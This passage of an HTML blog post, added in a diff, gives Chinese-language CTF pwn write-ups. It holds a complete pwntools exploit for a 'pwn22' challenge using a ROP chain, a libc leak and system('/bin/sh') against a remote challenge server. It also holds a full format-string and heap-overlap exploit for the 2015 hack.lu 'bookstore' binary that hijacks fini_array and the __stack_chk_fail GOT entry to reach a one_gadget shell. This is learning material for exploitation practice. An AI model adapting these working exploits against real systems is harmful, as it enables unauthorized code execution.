+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;wt.exe&#39;, &#39;wsl&#39;]
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+#io = process(&#39;./pwn22&#39;)
+io = remote(&#39;61.147.171.105&#39;, 52245)
+#gdb.attach(io,&#39;b *0x00000000004007C6&#39;)
+#pause()
+elf = ELF(&#39;./pwn22&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+saf = lambda x, y: io.sendlineafter(x, y)
+call_read = 0x0000000000400814
+puts_plt = elf.plt[&#39;puts&#39;]
+read_got = elf.got[&#39;read&#39;]
+pop_rdi = 0x00000000004008a3
+main = 0x00000000004007CD
+pad = 0x18 * b&#39;a&#39;
+ret = 0x000000000040089A
+just_ret = 0x0000000000400589
+payload = flat(pad, ret, pop_rdi, pop_rdi, just_ret, pop_rdi, read_got, puts_plt, main)
+io.sendline(payload)
+io.recvuntil(b&#39;\x40&#39;)
+leak = u64(io.recvuntil(&#34;\x7f&#34;).ljust(8,b&#39;\x00&#39;))
+log.success(hex(leak))
+libc = LibcSearcher(&#34;read&#34;, leak)
+libcbase = leak - libc.dump(&#34;read&#34;)
+system = libcbase + libc.dump(&#34;system&#34;)
+binsh = libcbase + libc.dump(&#34;str_bin_sh&#34;)
+log.success(hex(system))
+
+
+payload = flat(pad, ret, pop_rdi, pop_rdi, pop_rdi, binsh, system, main)
+io.sendline(payload)
+
+io.interactive()
+</code></pre><h1 id="wiki">wiki</h1>
+<h2 id="2015-hacklu-bookstore">2015 hacklu bookstore</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./books&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./books&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io,&#34;b printf&#34;)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;-splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>fini_array0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6011B8</span>
+</span></span><span style="display:flex;"><span>fini_array1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6011e0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_fst</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;5: Submit&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_sec</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;5: Submit&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(order:int, content:bytes):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;5: Submit&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(order))
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;order:&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(content)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit</span>(content:bytes):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span> <span style="color:#f92672">+</span> content)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format_payload</span>(fmt:str, fini_array:int, ch:int):
+</span></span><span style="display:flex;"><span>    fmt <span style="color:#f92672">=</span> fmt<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmt <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x74</span> <span style="color:#f92672">-</span> len(fmt))<span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x151</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#dest-&gt;fmt</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x140</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x150</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#ae81ff">1</span>,payload)
+</span></span><span style="display:flex;"><span>    delete_sec()
+</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;f&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> p64(fini_array) <span style="color:#f92672">+</span> p64(fini_array <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> p64(fini_array <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> p64(ch) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) 
+</span></span><span style="display:flex;"><span>    submit(content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0a39</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">15</span>
+</span></span><span style="display:flex;"><span>fmt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.%31$p,%24$p%</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">x%13$hn&#39;</span><span style="color:#f92672">.</span>format(padding)
+</span></span><span style="display:flex;"><span>format_payload(fmt, fini_array0, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Order 2: Order 1: .&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Order 2: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">.&#39;</span>)
+</span></span><span style="display:flex;"><span>leak_adress <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>leak_stack <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;stack adress leaked -&gt;&#34;</span> <span style="color:#f92672">+</span> hex(leak_stack))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;lib adress leaked -&gt;&#34;</span> <span style="color:#f92672">+</span> hex(leak_adress))
+</span></span><span style="display:flex;"><span>libcbase <span style="color:#f92672">=</span> leak_adress <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">240</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;libc base -&gt;&#34;</span> <span style="color:#f92672">+</span> hex(libcbase))
+</span></span><span style="display:flex;"><span>og <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf1247</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;one_gadget adress -&gt;&#34;</span> <span style="color:#f92672">+</span> hex(og))
+</span></span><span style="display:flex;"><span>ret_stack <span style="color:#f92672">=</span> leak_stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3e</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>
+</span></span><span style="display:flex;"><span>low_byte <span style="color:#f92672">=</span> int(hex(og)[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:],<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>mid_byte <span style="color:#f92672">=</span> int(hex(og)[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>high_byte <span style="color:#f92672">=</span> int(hex(og)[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#high_byte = int(hex(og)[2:10], 16)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#low_byte = int(hex(og)[10:14], 16)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#fmt = f&#39;%{mid_byte}c%15$hn%{(low_byte - mid_byte)}c%14$hn%{0xffffffff}c%{0xffff3243}c%10$n&#39;</span>
+</span></span><span style="display:flex;"><span>first <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;va&#34;</span>: low_byte, <span style="color:#e6db74">&#34;place&#34;</span>: <span style="color:#ae81ff">14</span>}
+</span></span><span style="display:flex;"><span>second <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;va&#34;</span>: mid_byte, <span style="color:#e6db74">&#34;place&#34;</span>: <span style="color:#ae81ff">15</span>}
+</span></span><span style="display:flex;"><span>third  <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;va&#34;</span>: high_byte, <span style="color:#e6db74">&#34;place&#34;</span>: <span style="color:#ae81ff">16</span>}
+</span></span><span style="display:flex;"><span>list <span style="color:#f92672">=</span> [first, second, third]
+</span></span><span style="display:flex;"><span>list <span style="color:#f92672">=</span> sorted(list, key <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : x[<span style="color:#e6db74">&#34;va&#34;</span>] )
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> list :
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;va</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> :&#34;</span> <span style="color:#f92672">+</span> hex(b[<span style="color:#e6db74">&#34;va&#34;</span>]))
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fmt <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%17$n%</span><span style="color:#e6db74">{</span>list[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;va&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">c%</span><span style="color:#e6db74">{</span>list[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;place&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">$hn%</span><span style="color:#e6db74">{</span>list[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#34;va&#34;</span>] <span style="color:#f92672">-</span> list[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;va&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">c%</span><span style="color:#e6db74">{</span>list[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#34;place&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">$hn%</span><span style="color:#e6db74">{</span>list[<span style="color:#ae81ff">2</span>][<span style="color:#e6db74">&#34;va&#34;</span>] <span style="color:#f92672">-</span> list[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#34;va&#34;</span>] <span style="color:#e6db74">}</span><span style="color:#e6db74">c%</span><span style="color:#e6db74">{</span>list[<span style="color:#ae81ff">2</span>][<span style="color:#e6db74">&#34;place&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">$hn&#39;</span>
+</span></span><span style="display:flex;"><span>format_payload(fmt, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;__stack_chk_fail&#34;</span>], ret_stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;one_gadget adress -&gt;&#34;</span> <span style="color:#f92672">+</span> hex(og))
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>本体涉及堆的主要就是一个无限制输入然后实现堆重叠加上格式化。在submit的时候给它我们先前释放的堆块。从而可以控制<code>dest</code>堆块以实现格式化字符串。</p>
+<p><img src="C:%5CUsers%5C32448%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250921194649119.png" alt="image-20250921194649119"></p>
+<p>从而有一次无限制<code>leak</code>（只要它在栈上）。为了控制执行流程让我们有机会重新执行main函数，这里篡改了<code>fini_arry</code>从而实现一次性的流程控制（新的一次<code>main</code>执行完毕之后就直接退出了）。显而易见的一种选择是格式化字符串修改返回地址随后<code>one_gadget</code>控制执行。但我在修改的时候常常出现<code>canary</code>被破坏的情况（待查明）。因此我就选择了将错就错，修改<code>canary</code>后篡改<code>got</code>表劫持<code>__stack_chk_fail</code>，成功。</p>
+<p>关于<code>one_gadget</code>:</p>
+<p><img src="C:%5CUsers%5C32448%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250921195244729.png" alt="image-20250921195244729"></p>
+<p>下面是调用到<code>__stack_chk_fail</code>时候的栈情况，我们发现第二个<code>constrains</code>的区域正好在我们输入选择的可控制缓冲区。</p>
+<p><img src="C:%5CUsers%5C32448%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250921195347628.png" alt="image-20250921195347628"></p>
+<p>选择<code>gadget 2</code>最终成功。</p>
+<p><img src="C:%5CUsers%5C32448%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250921195545726.png" alt="image-20250921195545726"></p>
+
+                </div>
+            </article>
+
+            <hr />
+
+            <div class="post-info">
+                
+                
+            </div>
+        </main>
+    </div>
+
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.08b680078a3cf9c69e3dd217a5aa52cfddd4a1d850f8cdff127fdd7421a71f8b2b474be69386f67819edace92273916e7230c9054f38107db9dc6730b3530ab5.js" integrity="sha512-CLaAB4o8&#43;caePdIXpapSz93UodhQ&#43;M3/En/ddCGnH4srR0vmk4b2eBntrOkic5FucjDJBU84EH253Gcws1MKtQ=="></script>
+
+
+
+
+    </body>
+</html>
